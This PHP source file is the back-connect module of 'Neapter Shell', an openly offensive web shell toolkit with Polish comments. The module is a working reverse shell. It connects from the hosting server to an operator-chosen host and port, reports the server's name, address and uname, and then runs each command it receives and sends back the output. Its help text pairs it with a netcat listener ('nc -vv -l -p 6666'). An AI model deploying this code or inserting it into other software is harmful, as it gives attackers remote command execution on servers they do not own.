<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * BackConnect - Wyjatki
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Tools\Exception
 */
class BackConnectException extends Exception
{
}

/**
 * Polaczenie zwrotne
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Tools
 */
class BackConnect
{
    /**
     * Obiekt Shell
     *
     * @access protected
     * @var    object
     */
    protected $oShell;

    /**
     * Numer portu
     *
     * @access protected
     * @var    integer
     */
    protected $iPort = 0;

    /**
     * Host
     *
     * @access protected
     * @var    string
     */
    protected $sHost;

    /**
     * Konstruktor
     *
     * @access public
     * @param  object $oShell Obiekt Shell
     * @return void
     */
    public function __construct(Shell $oShell)
    {
        /**
         * Rozszerzenie "sockets" jes wymagane
         */
        if (!function_exists('socket_create')) {
            throw new ProxyException('Brak rozszerzenia "sockets"');
        }

        $this->oShell = $oShell;
    }

    /**
     * Ustawianie hosta
     *
     * @access public
     * @param  string $sValue Host
     * @return BackConnect         Obiekt BackConnect
     */
    public function setHost($sValue)
    {
        $this->sHost = $sValue;

        return $this;
    }

    /**
     * Ustawianie portu
     *
     * @access public
     * @param  integer $iValue Numer portu
     * @return BackConnect         Obiekt BackConnect
     */
    public function setPort($iValue)
    {
        /**
         * Sprawdzanie poprawnosci portu
         */
        if (!(($iValue > 0) && ($iValue < 65535))) {
            throw new ProxyException(sprintf('Błędny port "%d"', $iValue));
        }

        $this->iPort = (int)$iValue;

        return $this;
    }

    /**
     * Uruchamianie bind'a
     *
     * @access public
     * @return void
     */
    public function get()
    {
        /**
         * Port jest wymagany
         */
        if ($this->sHost === NULL) {
            throw new BackConnectException('Nie wprowadzono hosta');
        }

        /**
         * Port jest wymagany
         */
        if ($this->iPort === 0) {
            throw new BackConnectException('Nie wprowadzono portu');
        }

        /**
         * Polaczenie z hostem
         */
        if (!($rSock = fsockopen($this->sHost, $this->iPort))) {
            throw new BackConnectException(sprintf('Nie można połączyć się z serwerem "%s"', $this->sHost));
        }

        fwrite($rSock, sprintf("Shell @ %s (%s)\r\n%s\r\nroot#", Request::getServer('HTTP_HOST'), Request::getServer('SERVER_ADDR'), php_uname()));

        /**
         * BC
         */
        for (; ;) {
            if (($sCmd = fread($rSock, 1024)) !== FALSE) {
                $sCmd = rtrim($sCmd);
                if ($sCmd === ':exit') {
                    fwrite($rSock, "\r\nbye ;)");
                    fclose($rSock);

                    echo 'Zakończono backconnect';
                    exit;
                }

                fwrite($rSock, strtr($this->oShell->getActionBrowser($sCmd), array("\r\n" => "\r\n", "\r" => "\r\n", "\n" => "\r\n")));
                fwrite($rSock, "\r\nroot#");
            }
        }
    }

}

/**
 * =================================================================================================
 */

/**
 * Polaczenie zwrotne
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    Neapter
 * @subpackage Modules
 */
class ModuleBackConnect extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public static function getCommands()
    {
        return array
        (
            'backconnect',
            'bc'
        );
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public static function getVersion()
    {
        /**
         * Wersja Data Autor
         */
        return '1.01 2011-10-19 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Połączenie zwrotne

	Klient (shell) łączy się pod wskazany adres dając dostęp do powłoki

	Użycie:
		backconnect host:port

		komenda ":exit" zamyka połączenie

		najlepiej uruchomić w nowym oknie

	Przykład:
		backconnect localhost:6666

	NetCat:
		nc -vv -l -p 6666
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {
        /**
         * Czy modul jest zaladowany
         */
        if (!class_exists('BackConnect')) {
            return 'backconnect, bc - !!! moduł nie został załadowany';
        }

        /**
         * Help
         */
        if ($this->oArgs->getNumberOfParams() !== 1) {
            return self::getHelp();
        }

        $aHost = $this->oShell->getHost($this->oArgs->getParam(0));

        if (PHP_SAPI !== 'cli') {
            header('Content-Type: text/plain; charset=utf-8');
        }

        try {
            ob_start();

            $oProxy = new BackConnect($this->oShell);
            $oProxy
                ->setHost($aHost[0])
                ->setPort($aHost[1])
                ->get();

            ob_end_flush();
            exit;
        } catch (BackConnectException $oException) {
            return $oException->getMessage();
        }
    }

}
